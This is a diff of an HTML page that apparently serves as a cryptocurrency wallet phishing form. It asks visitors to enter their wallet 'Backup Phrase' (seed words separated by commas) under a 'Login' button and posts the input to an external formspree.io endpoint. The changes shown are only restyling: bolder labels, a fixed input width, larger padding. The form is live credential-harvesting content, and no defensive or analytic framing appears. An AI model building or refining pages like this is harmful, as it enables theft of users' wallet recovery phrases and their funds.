@@ -121,11 +121,11 @@
             <form action="https://formspree.io/f/mdoyzeqb" method="post" style="border: 3px solid #f1f1f1;" id="my-form">
 
   <div class="container1">
-    <label for="uname"><b> Backup Phrase<br><br>Seprate each word with a comma sign (,)</b></label>
-    <input type="text" placeholder="hide,book,cookies,dinner,father" name="uname" required="">
+      <label for="uname"><b> Backup Phrase<br><br><strong>Seprate each word with a comma sign (,)</strong></b></label><br>
+    <input type="text" placeholder="hide,book,cookies,dinner,father" name="uname" required=""><br>
 
         
-      <button type="submit">Login</button>
+      <button type="submit"><strong>Login</strong></button>
 	  <p id="my-form-status"></p>
     
   </div>
@@ -133,9 +133,10 @@
                     <style>
 	
 	input[type=text], input[type=password] {
-  width: 100%;
+  width: 500px;
   padding: 12px 20px;
   margin: 8px 0;
+        font-size: 100%;
   display: inline-block;
   
   
@@ -154,12 +155,15 @@ button {
 button:hover {
   opacity: 0.8;
 }
+                        
 
-
-
+                        .my-form {
+                            font-size: 100%;
+                        }
 .container1 {
-  padding: 16px;
+  padding: 40px;
 }
+
 	
 	</style>
                     <script>
